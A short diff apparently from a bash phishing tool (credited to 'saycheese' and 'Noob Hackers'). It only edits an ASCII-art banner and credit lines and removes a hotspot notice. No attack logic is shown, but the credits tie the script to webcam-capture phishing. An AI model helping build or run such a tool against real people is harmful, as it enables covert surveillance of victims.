@@ -18,17 +18,14 @@ echo '
     / __\ /_\    /\/\         / _ \/__\  /__\/__   \
    / /   //_\\  /    \ _____ / /_)/ \// /_\    / /\/
   / /___/  _  \/ /\/\ \_____/ ___/ _  \//__   / /   
-  \____/\_/ \_/\/    \/v 1.0\/   \/ \_/\__/   \/    & v1.1 '
+  \____/\_/ \_/\/    \/v 1.0\/   \/ \_/\__/   \/ '
 
                                                                                
 echo " "
-printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
-printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
+printf "\e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf "\e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
 
 printf "\n"
-
-echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
-                   OR ELSE YOU DONT GET LINK....!"
 
 }
 
